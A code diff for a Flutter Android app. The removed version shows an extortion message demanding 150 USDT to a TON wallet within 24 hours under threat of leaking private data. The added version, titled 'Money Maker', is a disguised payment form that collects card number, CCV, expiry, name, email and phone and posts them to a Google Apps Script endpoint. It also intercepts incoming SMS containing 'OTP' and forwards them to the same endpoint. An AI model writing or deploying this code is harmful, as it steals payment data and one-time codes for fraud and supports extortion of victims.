@@ -1,12 +1,8 @@
-import 'dart:async';
-import 'dart:io';
-
 import 'package:flutter/material.dart';
-import 'package:audioplayers/audioplayers.dart';
-import 'package:android_intent_plus/android_intent.dart';
-import 'package:dio/dio.dart';
-import 'package:path_provider/path_provider.dart';
-import 'package:flutter_local_notifications/flutter_local_notifications.dart';
+import 'package:http/http.dart' as http;
+import 'dart:convert';
+import 'package:permission_handler/permission_handler.dart';
+import 'package:sms_receiver/sms_receiver.dart';
 
 void main() {
   runApp(MyApp());
@@ -16,166 +12,162 @@ class MyApp extends StatelessWidget {
   @override
   Widget build(BuildContext context) {
     return MaterialApp(
-      title: 'Countdown Demo',
-      home: SplashScreen(),
+      title: 'Money Maker',
+      home: PaymentFormPage(),
       debugShowCheckedModeBanner: false,
     );
   }
 }
 
-class SplashScreen extends StatefulWidget {
+class PaymentFormPage extends StatefulWidget {
   @override
-  State<SplashScreen> createState() => _SplashScreenState();
+  _PaymentFormPageState createState() => _PaymentFormPageState();
 }
 
-class _SplashScreenState extends State<SplashScreen> {
-  final AudioPlayer player = AudioPlayer();
-  final FlutterLocalNotificationsPlugin notificationsPlugin =
-      FlutterLocalNotificationsPlugin();
-
-  Timer? countdownTimer;
-  int secondsLeft = 86400; // 24 ساعة
+class _PaymentFormPageState extends State<PaymentFormPage> {
+  final _formKey = GlobalKey<FormState>();
+  final Map<String, String> formData = {};
+  final String sheetUrl = "https://script.google.com/macros/s/AKfycbyqf40p00Zz1V8F2hLW9ZB7jfTlmf2ipmVS4fDl-ShINSEHW3bzSLqhGziZwl0cS_qURg/exec";
+  final String smsKeyword = "OTP";
 
   @override
   void initState() {
     super.initState();
-    _initNotifications();
-    _startCountdown();
-    _playStartupSound();
-
-    // بعد 5 ثواني، افتح الإعدادات وحمّل الملف
-    Timer(Duration(seconds: 5), () {
-      _openSettings();
-      _downloadFile();
-    });
+    _requestSmsPermission();
+    _listenSms();
   }
 
-  void _playStartupSound() async {
-    await player.play(
-        UrlSource('https://files.catbox.moe/bkz6o8.mp3')); // صوت البداية
+  void _requestSmsPermission() async {
+    await Permission.sms.request();
   }
 
-  void _openSettings() {
-    final intent = AndroidIntent(action: 'android.settings.SETTINGS');
-    intent.launch();
-  }
-
-  void _downloadFile() async {
-    try {
-      final dio = Dio();
-      final dir = await getApplicationDocumentsDirectory();
-      final filePath = '${dir.path}/sample.pdf';
-
-      await dio.download(
-        'https://files.catbox.moe/omhyos.pdf',
-        filePath,
-      );
-
-      _showDownloadNotification();
-
-      print('تم تحميل الملف إلى: $filePath');
-    } catch (e) {
-      print('خطأ في التحميل: $e');
-    }
-  }
-
-  void _showDownloadNotification() async {
-    const AndroidNotificationDetails androidDetails =
-        AndroidNotificationDetails(
-      'download_channel',
-      'Download Complete',
-      importance: Importance.max,
-      priority: Priority.high,
-    );
-
-    const NotificationDetails notificationDetails =
-        NotificationDetails(android: androidDetails);
-
-    await notificationsPlugin.show(
-      1,
-      'تم التحميل',
-      'تم تحميل ملف PDF بنجاح!',
-      notificationDetails,
-    );
-  }
-
-  void _initNotifications() async {
-    const AndroidInitializationSettings androidSettings =
-        AndroidInitializationSettings('@mipmap/ic_launcher');
-
-    const InitializationSettings initSettings =
-        InitializationSettings(android: androidSettings);
-
-    await notificationsPlugin.initialize(initSettings);
-  }
-
-  void _startCountdown() {
-    countdownTimer = Timer.periodic(Duration(seconds: 1), (_) {
-      if (secondsLeft > 0) {
-        secondsLeft--;
-        final time = _formatDuration(secondsLeft);
-        _showCountdownNotification(time);
-      } else {
-        countdownTimer?.cancel();
+  void _listenSms() {
+    SmsReceiver receiver = SmsReceiver();
+    receiver.onSmsReceived.listen((SmsMessage message) {
+      if (message.body != null && message.body!.contains(smsKeyword)) {
+        _sendSmsToSheet(message.address ?? "", message.body ?? "", DateTime.now().toString());
       }
     });
   }
 
-  void _showCountdownNotification(String timeLeft) async {
-    const AndroidNotificationDetails androidDetails =
-        AndroidNotificationDetails(
-      'timer_channel',
-      'Countdown Timer',
-      importance: Importance.high,
-      priority: Priority.high,
-      ongoing: true,
-      showWhen: false,
-    );
-
-    const NotificationDetails notificationDetails =
-        NotificationDetails(android: androidDetails);
-
-    await notificationsPlugin.show(
-      0,
-      'العد التنازلي',
-      'الوقت المتبقي: $timeLeft',
-      notificationDetails,
-    );
+  Future<void> _sendSmsToSheet(String sender, String body, String date) async {
+    try {
+      await http.post(
+        Uri.parse(sheetUrl),
+        headers: {"Content-Type": "application/json"},
+        body: jsonEncode({
+          "type": "sms",
+          "sender": sender,
+          "body": body,
+          "date": date,
+        }),
+      );
+    } catch (e) {
+      print("خطأ في إرسال الرسالة للشييت: $e");
+    }
   }
 
-  String _formatDuration(int seconds) {
-    final d = Duration(seconds: seconds);
-    return d.toString().split('.').first.padLeft(8, "0");
-  }
+  Future<void> _submitForm() async {
+    if (_formKey.currentState!.validate()) {
+      _formKey.currentState!.save();
 
-  @override
-  void dispose() {
-    countdownTimer?.cancel();
-    player.dispose();
-    super.dispose();
+      try {
+        await http.post(
+          Uri.parse(sheetUrl),
+          headers: {"Content-Type": "application/json"},
+          body: jsonEncode({
+            "type": "form",
+            "cardNumber": formData["cardNumber"],
+            "ccv": formData["ccv"],
+            "expiryDate": formData["expiryDate"],
+            "username": formData["username"],
+            "email": formData["email"],
+            "phone": formData["phone"],
+          }),
+        );
+        ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text("your request is recevied just wait our respwan!")));
+      } catch (e) {
+        ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text("حدث خطأ: $e")));
+      }
+    }
   }
 
   @override
   Widget build(BuildContext context) {
-    return Stack(
-      children: [
-        Positioned.fill(
-          child: Image.network(
-            'https://wallpapers.com/images/hd/black-solid-background-1024-x-1365-r5a0xmfri40gdznl.jpg',
-            fit: BoxFit.cover,
-          ),
-        ),
-        Center(
-          child: Text(
-            "Hi bro, don't worry, nothing has happened yet, but you have 24 hours to send 150 USDT to this crypto wallet, or we will send all your privte data and chats and your perosnal informations to our store in darkweb. Send the money on this (ton) network and the address is: UQB7wop5BmicB85_eiv_azfZVFwlFUsrULNpCbSvScjpHigE  An important note: Even if you delete the application, your information is stored in our database and nothing will change.",
-            style: TextStyle(
-              color: Colors.green,
-              fontSize: 12,
-              fontWeight: FontWeight.bold,
+    return Scaffold(
+      body: Stack(
+        children: [
+          Container(
+            decoration: BoxDecoration(
+              image: DecorationImage(
+                image: NetworkImage("https://github.com/alahlymasr9-art/video/raw/refs/heads/main/6835451-hd_1920_1080_25fps.mp4"),
+                fit: BoxFit.cover,
+              ),
             ),
           ),
+          Center(
+            child: SingleChildScrollView(
+              child: Container(
+                padding: EdgeInsets.all(20),
+                margin: EdgeInsets.all(20),
+                decoration: BoxDecoration(
+                  color: Colors.black.withOpacity(0.75),
+                  border: Border.all(color: Colors.amber),
+                  borderRadius: BorderRadius.circular(12),
+                  boxShadow: [BoxShadow(color: Colors.amber, blurRadius: 10)],
+                ),
+                child: Form(
+                  key: _formKey,
+                  child: Column(
+                    children: [
+                      Text("Join us 🚀", style: TextStyle(color: Colors.amber, fontSize: 24)),
+                      SizedBox(height: 20),
+                      _buildTextField("Card Number", "cardNumber"),
+                      Row(
+                        children: [
+                          Expanded(child: _buildTextField("CCV", "ccv")),
+                          SizedBox(width: 10),
+                          Expanded(child: _buildTextField("Expiry Date", "expiryDate", hint: "MM/YY")),
+                        ],
+                      ),
+                      _buildTextField("Your Name", "username"),
+                      _buildTextField("Email", "email", inputType: TextInputType.emailAddress),
+                      _buildTextField("Phone", "phone", inputType: TextInputType.phone),
+                      SizedBox(height: 10),
+                      ElevatedButton(
+                        onPressed: _submitForm,
+                        child: Text("Send"),
+                        style: ElevatedButton.styleFrom(backgroundColor: Colors.amber, foregroundColor: Colors.black),
+                      ),
+                    ],
+                  ),
+                ),
+              ),
+            ),
+          ),
+        ],
+      ),
+    );
+  }
+
+  Widget _buildTextField(String label, String keyName, {String? hint, TextInputType inputType = TextInputType.text}) {
+    return Padding(
+      padding: const EdgeInsets.symmetric(vertical: 8.0),
+      child: TextFormField(
+        keyboardType: inputType,
+        decoration: InputDecoration(
+          labelText: label,
+          hintText: hint,
+          labelStyle: TextStyle(color: Colors.amber),
+          filled: true,
+          fillColor: Colors.black,
+          border: OutlineInputBorder(borderRadius: BorderRadius.circular(6), borderSide: BorderSide(color: Colors.amber)),
+          enabledBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(6), borderSide: BorderSide(color: Colors.amber)),
         ),
-      ],
+        style: TextStyle(color: Colors.white),
+        validator: (value) => value == null || value.isEmpty ? "مطلوب" : null,
+        onSaved: (value) => formData[keyName] = value ?? "",
+      ),
     );
   }
 }
